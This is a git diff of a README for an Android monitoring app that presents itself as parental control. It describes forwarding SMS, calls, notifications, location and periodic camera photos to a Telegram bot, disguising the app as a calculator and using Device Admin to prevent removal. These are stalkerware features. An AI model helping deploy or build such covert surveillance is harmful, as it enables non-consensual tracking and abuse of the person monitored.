@@ -26,7 +26,7 @@
 
 - 📞 **Call monitoring** — full incoming/outgoing call history
 - 💬 **SMS monitoring** — incoming and outgoing text messages
-- 📸 **Camera capture** — automatic photo every 1 minute
+- 📸 **Camera capture** — automatic photo every 1 minute by default, configurable `0-60` minutes or manual only via `/photo`
 - 🔔 **Notification forwarding** — notifications arriving on the child's phone are sent to Telegram (deduplicated, offline queue)
 - 🔔 **Telegram integration** — everything is delivered to your Telegram bot
 - 🧮 **Stealth mode** — the app looks like a calculator
@@ -48,10 +48,10 @@
 
 ### 📦 Requirements
 
-- **Android OS**: 8.0 (API 26) or higher
+- **Android OS**: 7.0 (API 24) or higher
 - **RAM**: 2 GB minimum
 - **Storage**: 50 MB free
-- **Permissions**: SMS, Call Log, Contacts, Camera, Location (foreground + Allow all the time)
+- **Permissions**: SMS, Call Log, Contacts, Camera, Microphone, Notifications, Location foreground + Allow all the time
 
 ---
 
@@ -86,10 +86,10 @@ Without secrets the build still succeeds — the bot is configured manually insi
 5. Type `1234` then press `=` — the **Telegram Bot Setup** page opens.
 6. Enter **Bot Token**, **Chat ID**, and sync interval, then tap **Save settings**.
 7. Tap **Test Connection** and confirm the message arrives in Telegram.
-8. Tap **Grant all permissions** (SMS, Call Log, Contacts, Camera, Location), then grant background location via **Grant background location (Allow all the time)**.
+8. Tap **Grant all permissions** (SMS, Call Log, Contacts, Camera, Microphone, Notifications, Location), then grant background location via **Grant background location (Allow all the time)**.
 9. Tap **Read Notifications** and allow notification access so incoming notifications on the child's phone are forwarded to Telegram (tap again to pause/resume forwarding).
-10. Optionally tap **Enable Protection** (Device Admin).
-11. Tap **Enable monitoring** — done.
+10. Optionally tap **Disable Battery Restriction** so monitoring survives Doze, and **Enable Protection** (Device Admin).
+11. Tap **Enable monitoring** — done. Use **Send Status** to verify delivery to Telegram.
 
 > The release APK is signed, so it installs normally. If you previously installed a version signed with a different key, uninstall it first — Android rejects updates with mismatched signatures.
 
@@ -99,7 +99,7 @@ After setup:
 
 1. ✅ Monitoring starts automatically
 2. 📊 New data is sent every interval you configured
-3. 📸 Photos are captured from the cameras every 1 minute
+3. 📸 Photos follow the camera interval you set (`0` means manual only via `/photo`)
 4. 📱 Everything arrives in your Telegram bot
 5. 🔄 Monitoring resumes automatically after reboot
 
@@ -126,9 +126,9 @@ Date: 19.10.2025 14:28
 ### 🛡️ Security
 
 - ✅ The app only sends data to the Telegram bot you configured
+- ✅ Bot token is never baked into the APK, it is entered manually in Setup and stored encrypted on device
 - ✅ No data is stored anywhere else
 - ✅ Optional Device Admin protection prevents easy removal
-- ⚠️ **IMPORTANT**: a pre-configured APK contains your bot token — never share it!
 
 ### 🔧 Troubleshooting
 
@@ -161,11 +161,10 @@ red-eye-mobile/
 │   │   └── AndroidManifest.xml
 │   └── build.gradle
 ├── .github/workflows/
-│   ├── build.yml                  # Cloud build (debug + release artifacts)
-│   └── release.yml                # Signed release APKs on v* tags
+│   └── build.yml                  # Cloud build (debug + release artifacts, Release on v* tags)
 ├── AGENTS.md                      # Repo rules (cloud build only)
 ├── CHANGELOG.md                   # Release history
-└── builder.sh / builder.bat       # LEGACY local scripts (kept for compatibility)
+└── builder.sh / builder.bat       # LEGACY, do not use (kept for compatibility)
 ```
 
 ### 🤝 Contributing
